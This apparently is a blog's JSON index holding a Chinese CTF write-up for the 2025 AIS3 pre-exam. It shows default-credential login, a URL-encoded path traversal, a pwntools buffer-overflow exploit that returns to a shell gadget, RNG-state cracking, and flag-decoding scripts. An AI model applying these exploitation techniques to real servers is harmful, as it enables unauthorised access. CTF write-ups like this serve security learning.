
[{"content":" 2025 ais3 pre-exam write up # login screen 1 # 於login page 嘗試 admin/admin 成功登入 觀察 dockr-compose.yml 發現 db 可以訪問 下載後得到 2fa code 成功登入取得 flag\ntomorin db # 直接進入 /flag 會被 redirect\n將/ URL encode，進入 http://chals1.ais3.org:30000/..%2fflag 取得flag\nWelcome to the World of Ave Mujica # 動態分析發現有 burrfer overflow 使用 pwntools 的 cyclic 計算 offset\n丟進 ida 發現 0x401256 有一個 shell 將 return address 覆蓋為 0x4012D6 取得 shell\nimport pwn host = \u0026#34;chals1.ais3.org\u0026#34; port = 60122 conn = pwn.remote(host, port) # conn = pwn.gdb.debug(\u0026#34;./chal\u0026#34;, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc.so.6\u0026#34;}) conn.recvuntil(b\u0026#39;?\u0026#39;) conn.sendline(b\u0026#39;yes\u0026#39;) conn.recvuntil(b\u0026#39;: \u0026#39;) conn.sendline(b\u0026#39;-1\u0026#39;) conn.recvuntil(b\u0026#39;: \u0026#39;) g = pwn.cyclic_gen() conn.sendline(g.get(168) + pwn.p64(0x4012D6)) raman CTF # 掃描 qrcode 將發票號碼填入發票 app 在使用 google map 搜尋該地址取得flag\nAIS3 Tiny Server - Web / Misc # 題目提到root directory嘗試進入 chals1.ais3.org:20616// 成功取得flag 取得flag\nWelcome # 照著打 Stream # 可以暴力嘗試 a 並檢查 b 是否為完全平方數可以取得每輪使用的隨機數 因為 getrandbits() 使用 mt19937 ，只要取得 634*32bits 的已知隨機數可以預測後續生成之隨機數。\nfrom random import getrandbits from hashlib import sha512 import gmpy2 from pyrandcracker import RandCracker def rev(a: bytes, b: int): return int.from_bytes(a) ^ b craker = RandCracker() randbyte = [] for i in l: for j in range(256): r = rev(sha512(j.to_bytes()).digest(), i) if gmpy2.is_square(r): craker.submit(gmpy2.isqrt(r), 256) craker.check() print((l[80]^craker.rnd.getrandbits(256)**2).to_bytes(32, \u0026#39;big\u0026#39;)) AIS3 Tiny Server - Reverse # 丟進 IDA 可以看到 sub_1E20() 這個function會檢查flag\n寫腳本還原 flag\nimport struct def extract_flag(): encrypted_data = [ 1480073267, 1197221906, 254628393, 920154, 1343445007, 874076697, 1127428440, 1510228243, 743978009, 54940467, 1246382110 ] encrypted_bytes = [] for num in encrypted_data: bytes_from_int = struct.pack(\u0026#39;\u0026lt;I\u0026#39;, num) encrypted_bytes.extend(bytes_from_int) # The XOR key from v7 key = b\u0026#34;rikki_l0v3\u0026#34; encrypted_bytes.append(20) decrypted = bytearray(45) v2 = 51 v3 = 114 for i in range(45): decrypted[i] = v2 ^ v3 if i + 1 \u0026lt; 45: v2 = encrypted_bytes[i + 1] v3 = key[(i + 1) % len(key)] flag = decrypted.decode(\u0026#39;ascii\u0026#39;, errors=\u0026#39;ignore\u0026#39;).rstrip(\u0026#39;\\x00\u0026#39;) return flag if __name__ == \u0026#34;__main__\u0026#34;: flag = extract_flag() print(f\u0026#34;flag: {flag}\u0026#34;) 取得flag A simple snake game # 逆向發現有一個檢查分數和關卡的地方 patch 成 jg 進入遊戲取得 flag web flag checker # 從 source 可以看到 wasm 有一個函式叫 flag checker 丟給 claude 幫忙 reverse 並撰寫腳本\nimport struct def ror64(value, shift): \u0026#34;\u0026#34;\u0026#34;64-bit right rotation (inverse of left rotation)\u0026#34;\u0026#34;\u0026#34; value \u0026amp;= 0xFFFFFFFFFFFFFFFF shift \u0026amp;= 63 return ((value \u0026gt;\u0026gt; shift) | (value \u0026lt;\u0026lt; (64 - shift))) \u0026amp; 0xFFFFFFFFFFFFFFFF def solve_flag_properly(): expected_encrypted = [ 7577352992956835434, # Chunk 0: \u0026#34;AIS3{W4S\u0026#34; with ROR 45 7148661717033493303, # Chunk 1: \u0026#34;M_R3v3rs\u0026#34; with ROR 28 (-7081446828746089091) \u0026amp; 0xFFFFFFFFFFFFFFFF, # Chunk 2: needs brute force (-7479441386887439825) \u0026amp; 0xFFFFFFFFFFFFFFFF, # Chunk 3: needs brute force 8046961146294847270 # Chunk 4: \u0026#34;39229dd}\u0026#34; with ROR 61 ] for i in range (5): print(f\u0026#34;\\n--- Finding Chunk {i} ---\u0026#34;) encrypted2 = expected_encrypted[i] best_chunk2_candidates = [] for key in range(64): decrypted = ror64(encrypted2, key) try: bytes_data = struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, decrypted) text = bytes_data.decode(\u0026#39;ascii\u0026#39;, errors=\u0026#39;replace\u0026#39;) printable_count = sum(1 for c in text if c.isprintable() and c != \u0026#39;�\u0026#39;) if printable_count \u0026gt;= 6: best_chunk2_candidates.append((key, bytes_data, text, printable_count)) except: continue for key, data, text, score in best_chunk2_candidates[:10]: print(f\u0026#34; Key {key:2d}: {text}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: solve_flag_properly() 組合 flag 得到 AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}\n心得 # 總覺的今年特別捲，每題打完過沒多久就變100分到底想怎樣。\n","date":"25 July 2025","externalUrl":null,"permalink":"/posts/1753445505053-example/","section":"Posts","summary":"2025 ais3 pre-exam write up # login screen 1 # 於login page 嘗試 admin/admin 成功登入 觀察 dockr-compose.","title":"2025 ais3 pre-exam write up","type":"posts"},{"content":"","date":"25 July 2025","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"25 July 2025","externalUrl":null,"permalink":"/","section":"haoching's site","summary":"","title":"haoching's site","type":"page"},{"content":"","date":"25 July 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"25 July 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"25 July 2025","externalUrl":null,"permalink":"/tags/writeups/","section":"Tags","summary":"","title":"Writeups","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]